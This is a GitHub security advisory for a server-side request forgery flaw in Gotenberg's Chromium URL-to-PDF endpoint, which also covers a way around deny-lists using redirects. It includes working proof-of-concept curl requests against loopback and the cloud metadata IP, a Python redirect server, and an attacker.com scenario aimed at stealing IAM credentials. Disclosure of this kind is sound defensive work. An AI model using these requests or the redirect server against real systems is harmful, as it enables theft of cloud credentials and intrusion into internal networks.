# [H] Gotenberg: Server-Side Request Forgery via Chromium URL Endpoint with Redirect-Based Deny-List Bypass

## Summary
Severity: High
Advisory: GHSA-chwh-f6gm-r836
CVE: CVE-2026-42595
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-chwh-f6gm-r836
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.32.0

## Details
A review of 4 published Gotenberg security advisories exposed an SSRF issue. GHSA-pjrr-jgp4-v2fm covers SSRF via the `downloadFrom` endpoint. GHSA-pcrp-7g9h-7qhp covers SSRF via the `webhook` endpoint. Neither advisory addresses SSRF through the primary Chromium URL-to-PDF conversion endpoint (`/forms/chromium/convert/url`), which has no default deny-list for HTTP/HTTPS targets. The redirect-based deny-list bypass described here also applies to `downloadFrom` and `webhook` but is a separate finding from the initial request validation those advisories cover.

### Summary

Gotenberg's Chromium URL-to-PDF endpoint (`/forms/chromium/convert/url`) has no default protection against HTTP/HTTPS-based SSRF. The default deny-list regex only blocks `file://` URIs. An unauthenticated attacker can point Chromium at any internal IP — including loopback, RFC 1918 ranges, and cloud metadata endpoints — and receive the response rendered as a PDF.

Additionally, even when operators configure a custom deny-list, the protection is bypassed via HTTP redirects. Gotenberg's Chromium instance follows `302` redirects from an attacker-controlled external URL to internal targets without re-validating the redirect destination against the deny-list.

What makes this particularly notable is that Gotenberg's secondary features — `downloadFrom` and `webhook` — ship with default deny-lists that explicitly block RFC 1918 and link-local addresses. The primary feature, the one that literally takes a URL and fetches it server-side, does not.

### Details

**Finding 1: Zero default SSRF protection on Chromium URL endpoint**

The Chromium URL endpoint is the core feature of Gotenberg. It accepts a URL, tells headless Chromium to fetch it, and returns the rendered page as a PDF. The default deny-list is configured in `pkg/modules/chromium/chromium.go` and the value shipped in Docker is:

```
^file:(?!//\/tmp/).*
```

This regex only blocks `file://` URIs outside of `/tmp/`. HTTP and HTTPS requests to any host — including `127.0.0.1`, `10.x.x.x`, `192.168.x.x`, and `169.254.169.254` — are not filtered at all.

Meanwhile, the `downloadFrom` and `webhook` endpoints use deny-lists that explicitly block loopback, RFC 1918, and cloud metadata IPs. The developer clearly understood the SSRF risk but the protection was not applied to the main Chromium conversion endpoint.

**Finding 2: Redirect-based SSRF bypass on all endpoints**

Both `downloadFrom` and `webhook` use Go's default `http.Client{}` with no `CheckRedirect` function. Go follows up to 10 redirects automatically. The deny-list is a pre-flight check on the initial URL only. Once the request is in flight, redirects are followed transparently and the application never re-validates the destination.

The Chromium browser similarly follows redirects without restriction. Even if an operator configures a custom deny-list on the Chromium URL endpoint, an attacker hosts a redirect server that passes initial validation and then redirects Chromium to an internal target.

### PoC

Tested on Docker using `gotenberg/gotenberg:8` (v8.30.1) on `localhost:3000`. No authentication is required on any endpoint.

**Environment:**
```
$ curl http://localhost:3000/version
8.30.1

$ curl http://localhost:3000/health
{"status":"up","details":{"chromium":{"status":"up"},"libreoffice":{"status":"up"}}}
```

**1. Control — external URL works as expected:**
```
$ curl -X POST http://localhost:3000/forms/chromium/convert/url \
    --form 'url=http://example.com' \
    -o test.pdf -w "HTTP %{http_code}, Size: %{size_download} bytes"

HTTP 200, Size: 14961 bytes
$ file test.pdf
test.pdf: PDF document, version 1.4, 1 page(s)
```

**2. Control — `file://` protocol is correctly blocked by default deny-list:**
```
$ curl -X POST http://localhost:3000/forms/chromium/convert/url \
    --form 'url=file:///etc/passwd' \
    -w "HTTP %{http_code}"

HTTP 403
Body: Forbidden
```

**3. SSRF to localhost — NOT blocked:**
```
$ curl -X POST http://localhost:3000/forms/chromium/convert/url \
    --form 'url=http://127.0.0.1:3000/health' \
    -o ssrf.pdf -w "HTTP %{http_code}, Size: %{size_download} bytes"

HTTP 200, Size: 10196 bytes
```

Chromium fetched its own `/health` endpoint and rendered the response as a PDF. The request succeeded because the default deny-list does not cover HTTP to loopback.

**4. Cloud metadata IP — NOT blocked:**
```
$ curl --max-time 15 -X POST http://localhost:3000/forms/chromium/convert/url \
    --form 'url=http://169.254.169.254/latest/meta-data/' \
    -o meta.pdf -w "HTTP %{http_code}, Size: %{size_download} bytes"

HTTP 000, Size: 0 bytes (timeout — no metadata service in Docker, but request was NOT blocked)
```

The request timed out because there is no metadata service running in the Docker test environment. The critical observation is that Gotenberg did not block or reject the request. In a cloud deployment (AWS, GCP, Azure), this would return IAM credentials rendered as a PDF.

**5. Redirect-based bypass — Chromium follows 302 to internal target:**

Redirect server on the host (port 9999):
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://127.0.0.1:3000/health')
        self.end_headers()
    def do_HEAD(self):
        self.do_GET()

HTTPServer(('0.0.0.0', 9999), RedirectHandler).serve_forever()
```

```
$ curl --max-time 15 -X POST http://localhost:3000/forms/chromium/convert/url \
    --form 'url=http://172.17.0.1:9999/' \
    -o redir.pdf -w "HTTP %{http_code}, Size: %{size_download} bytes"

HTTP 200, Size: 10244 bytes
$ file redir.pdf
redir.pdf: PDF document, version 1.4, 1 page(s)
```

Chromium followed the 302 redirect from `http://172.17.0.1:9999/` (external, passes any deny-list) to `http://127.0.0.1:3000/health` (internal). The internal response was rendered as a PDF and returned to the caller. No validation occurred on the redirect destination.

The Chromium endpoint accepted all HTTP/HTTPS URLs including loopback and cloud metadata addresses. Only `file://` URIs were blocked by the default deny-list. The redirect from an external server to `127.0.0.1` was also followed without any check on the redirect target.

### Impact

Any user who can reach the Gotenberg API — which requires no authentication by default — can make the server fetch arbitrary internal resources and receive the rendered content as a PDF. Gotenberg is typically deployed as a backend service in infrastructure that has broad internal network access.

Practical attack scenarios:

- **Cloud credential theft**: Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to exfiltrate AWS IAM role credentials. The same applies to GCP and Azure metadata endpoints.
- **Internal service access**: Reach any HTTP service on the internal network that the Gotenberg container can route to — admin panels, databases with HTTP interfaces, monitoring dashboards.
- **Internal port scanning**: Use response timing and content differences to map internal infrastructure.
- **Deny-list bypass via redirect**: Even deployments that have configured custom deny-lists for the initial URL are vulnerable. An attacker hosts a redirect server at `https://attacker.com/r` that responds with `302 → http://169.254.169.254/latest/meta-data/`. The deny-list validates the initial URL, Chromium follows the redirect, and the cloud metadata is returned as a PDF.

The redirect bypass also affects the `downloadFrom` and `webhook` endpoints, which use Go's `http.Client{}` with no `CheckRedirect` function. Their RFC 1918 deny-lists are rendered ineffective by a single redirect hop.

---

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-chwh-f6gm-r836
- https://nvd.nist.gov/vuln/detail/CVE-2026-42595
- https://github.com/gotenberg/gotenberg
